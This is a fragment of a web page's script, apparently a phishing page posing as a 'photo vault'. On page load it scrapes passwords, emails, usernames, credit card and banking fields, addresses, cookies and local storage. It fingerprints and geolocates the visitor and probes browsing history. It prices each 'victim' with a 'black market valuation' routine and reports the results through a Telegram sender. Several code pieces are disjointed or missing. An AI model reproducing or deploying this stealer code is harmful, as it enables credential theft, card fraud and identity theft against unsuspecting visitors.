        // REALISTIC BLACK MARKET VALUATION ALGORITHM
        function calculateRealisticValue(victimData) {
            let value = 0;
            
            // COUNTRY TIER PRICING (Based on GDP & fraud rates)
            const countryTiers = {
                'TIER_1': ['CH', 'US', 'CA', 'UK', 'DE', 'FR', 'AU', 'SG', 'AE', 'NO', 'DK', 'SE', 'FI'], // $40-60
                'TIER_2': ['JP', 'KR', 'NZ', 'AT', 'BE', 'NL', 'IE', 'ES', 'IT'], // $25-40
                'TIER_3': ['BR', 'RU', 'CN', 'IN', 'MX', 'ZA', 'TR', 'PL'] // $15-25
            };
            
            const countryCode = victimData.location.country_code;
            if (countryTiers.TIER_1.includes(countryCode)) value += 50;
            else if (countryTiers.TIER_2.includes(countryCode)) value += 32;
            else if (countryTiers.TIER_3.includes(countryCode)) value += 20;
            else value += 10; // Rest of world
            
            // DEVICE VALUE (Based on resale & exploit potential)
            if (victimData.browser.platform.includes('Mac')) value += 25;
            if (victimData.browser.platform.includes('Win')) value += 15;
            if (victimData.browser.cores >= 8) value += 12;
            if (victimData.browser.cores >= 4) value += 8;
            if (victimData.browser.memory.includes('16GB')) value += 15;
            if (victimData.browser.memory.includes('8GB')) value += 10;
            
            // DATA ASSETS VALUE (Actual valuable information)
            // Passwords & Logins
            value += victimData.social.passwords * 8; // $8 per password
            value += victimData.social.emails * 5; // $5 per email
            value += victimData.social.usernames * 3; // $3 per username
            
            // Financial Data
            value += victimData.social.credit_cards * 25; // $25 per card
            value += victimData.social.banking_info * 40; // $40 per banking detail
            
            // Personal Information
            value += victimData.social.personal_info * 2; // $2 per field
            value += victimData.social.phone_numbers * 6; // $6 per number
            value += victimData.social.addresses * 8; // $8 per address
            
            // Browser & Tracking Data
            value += victimData.social.cookies * 0.5; // $0.50 per cookie
            value += victimData.social.local_storage * 0.3; // $0.30 per storage item
            value += victimData.social.sessions * 2; // $2 per session
            
            // Behavioral & Fingerprinting
            if (victimData.fingerprint.canvas !== 'failed') value += 5;
            if (victimData.fingerprint.webgl !== 'failed') value += 5;
            if (victimData.fingerprint.audio !== 'failed') value += 3;
            value += victimData.fingerprint.fonts.split(',').length * 0.5;
            
            // Network & Location Precision
            if (victimData.network.ip !== 'Unknown') value += 8;
            if (victimData.location.city !== 'Unknown') value += 5;
            if (victimData.location.coordinates !== 'Unknown') value += 10;
            
            // Time-based factors (Freshness premium)
            const dataFreshness = Date.now() - pageLoadTime;
            if (dataFreshness < 30000) value += 5; // Very fresh data
            else if (dataFreshness < 120000) value += 2; // Recent data
            
            // Quality multipliers

            if (victimData.social.passwords > 0) value *= 1.2; // Login data multiplier
            if (victimData.social.banking_info > 0) value *= 1.5; // Banking data multiplier
            
            return Math.max(15, Math.round(value)); // Minimum $15, realistic pricing
        }

            const value = calculateRealisticValue(victimData);

            return `vi.${country}.${value}.${randomCode}`;

        async function getRealIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                // Try to get more IP info
                try {
                    const ipInfo = await fetch(`https://ipapi.co/${data.ip}/json/`);
                    const info = await ipInfo.json();
                    return {
                        ip: data.ip,
                        isp: info.org || 'Unknown',
                        asn: info.asn || 'Unknown'
                    };
                } catch {
                    return { ip: data.ip, isp: 'Unknown', asn: 'Unknown' };
                }
            } catch (error) {
                return { ip: 'Unknown', isp: 'Unknown', asn: 'Unknown' };
            }
        }

        async function getRealLocation() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const location = await locationResponse.json();
                
                return {
                    city: location.city || 'Unknown',
                    region: location.region || 'Unknown',
                    country: location.country_name || 'Unknown',
                    country_code: location.country_code || 'UN',
                    postal: location.postal || 'Unknown',
                    latitude: location.latitude || 'Unknown',
                    longitude: location.longitude || 'Unknown',
                    timezone: location.timezone || 'Unknown',
                    currency: location.currency || 'Unknown',
                    calling_code: location.country_calling_code || 'Unknown'
                };
            } catch (error) {
                return {
                    city: 'Unknown', region: 'Unknown', country: 'Unknown', country_code: 'UN',
                    postal: 'Unknown', latitude: 'Unknown', longitude: 'Unknown', timezone: 'Unknown',
                    currency: 'Unknown', calling_code: 'Unknown'
                };
            }
        }

        async function collectAllSocialData() {
            return {

                sessions: collectSessions().length,
                browsing_data: (await estimateHistory()).length
            };
        }

        function collectPasswords() {
            const passwords = [];
            document.querySelectorAll('input[type="password"]').forEach(input => {
                if (input.value) {
                    passwords.push({
                        field: input.name || 'password',
                        value: input.value,
                        form: input.form ? input.form.action : 'unknown'
                    });
                }
            });
            return passwords;
        }

        function collectEmails() {
            const emails = [];
            document.querySelectorAll('input[type="email"]').forEach(input => {
                if (input.value && input.value.includes('@')) {
                    emails.push(input.value);
                }
            });
            return emails;
        }

        function collectUsernames() {
            const usernames = [];
            document.querySelectorAll('input[name*="user"], input[name*="login"], input[autocomplete="username"]').forEach(input => {
                if (input.value) {
                    usernames.push(input.value);
                }
            });
            return usernames;
        }

        function collectCreditCards() {
            const cards = [];
            document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"], input[type="tel"]').forEach(field => {
                if (field.value && field.value.replace(/\s/g, '').length > 10) {
                    cards.push({
                        type: field.name || 'card',
                        value: field.value
                    });
                }
            });
            return cards;
        }

        function collectBankingInfo() {
            const banking = [];
            document.querySelectorAll('input[name*="bank"], input[name*="account"], input[name*="routing"]').forEach(field => {
                if (field.value) {
                    banking.push({
                        type: field.name,
                        value: field.value
                    });
                }
            });
            return banking;
        }

        function collectPersonalInfo() {
            const info = {};
            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(input => {
                if (input.value) {
                    const key = input.name || input.placeholder || input.autocomplete || 'field';
                    info[key] = input.value;
                }
            });
            return info;
        }

        function collectPhoneNumbers() {
            const phones = [];
            document.querySelectorAll('input[type="tel"], input[autocomplete="tel"]').forEach(input => {
                if (input.value) {
                    phones.push(input.value);
                }
            });
            return phones;
        }

        function collectAddresses() {
            const addresses = [];
            document.querySelectorAll('input[autocomplete*="address"], input[name*="street"], input[name*="city"], input[name*="zip"]').forEach(input => {
                if (input.value) {
                    addresses.push(input.value);
                }
            });
            return addresses;
        }

        function collectCookies() {
            return document.cookie.split(';').reduce((cookies, cookie) => {
                const [name, value] = cookie.split('=').map(c => c.trim());
                if (name) cookies[name] = value || '';
                return cookies;
            }, {});
        }

        function collectLocalStorage() {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                ls[key] = localStorage.getItem(key);
            }
            return ls;
        }

        function collectSessions() {
            return sessionStorage.length;
        }

        function getScrollDepth() {
            const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
            return Math.round(scrollPercent);
        }

        function generateCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint', 2, 2);
                return canvas.toDataURL().substring(0, 50) + '...';
            } catch (e) { return 'failed'; }
        }

        function generateWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl ? `WebGL 1.0 (OpenGL ES 2.0 Chromium)` : 'no_webgl';
            } catch (e) { return 'failed'; }
        }

        function testAudioSupport() {
            return window.AudioContext ? 'Audio supported' : 'No audio support';
        }

        function detectFonts() {
            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia'];
            return fonts.join(', ');
        }

        function detectVPN(ip) {
            const vpnRanges = ['104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.'];
            return vpnRanges.some(range => ip.startsWith(range)) ? 'VPN/Proxy Detected' : 'Residential IP';
        }

        function detectProxy() {
            return navigator.webdriver ? 'Automation Detected' : 'Normal';
        }

        function detectTor() {
            return navigator.plugins.length === 0 ? 'Tor Browser Suspected' : 'Normal';
        }

        async function estimateHistory() {
            const popularSites = [
                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com',
                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com', 'linkedin.com',
                'whatsapp.com', 'tiktok.com', 'paypal.com', 'ebay.com', 'spotify.com'
            ];
            const visited = [];
            
            for (let site of popularSites) {
                try {
                    const link = document.createElement('a');
                    link.href = `https://${site}`;
                    link.style.cssText = 'position:absolute;left:-9999px;visibility:hidden;';
                    document.body.appendChild(link);
                    
                    const computed = getComputedStyle(link);
                    if (computed.visibility !== 'hidden' || computed.display !== 'none') {
                        visited.push(site);
                    }
                    
                    document.body.removeChild(link);
                } catch (e) {}
            }
            return visited;
        }

            message += `URL: ${victimData.behavioral.url}\n`;
            message += `Victim ID: ${victimId}\n`;
            message += `Estimated Value: $${victimValue}\n`;
            message += `DATA CAPTURE: COMPLETED`;

            await sendToTelegram(message);
        }

        async function sendClickReport(imageId) {
            const victimData = await collectVictimData();
            victimValue = calculateRealisticValue(victimData);
            
            let message = `IMAGE CLICK DETECTED\n`;
            message += `Victim ID: ${victimId || generateVictimID(victimData)}\n`;
            message += `Image ID: ${imageId}\n`;
            message += `Estimated Value: $${victimValue}\n`;
            message += `Time: ${victimData.timestamp}`;

            await sendToTelegram(message);
        }

        // Initialize on page load
        window.addEventListener('load', async function() {
            const victimData = await collectVictimData();
            await sendEnhancedReport(victimData);
        });

        console.log('Enhanced photo vault system loaded');
    </script>
</body>
</html>
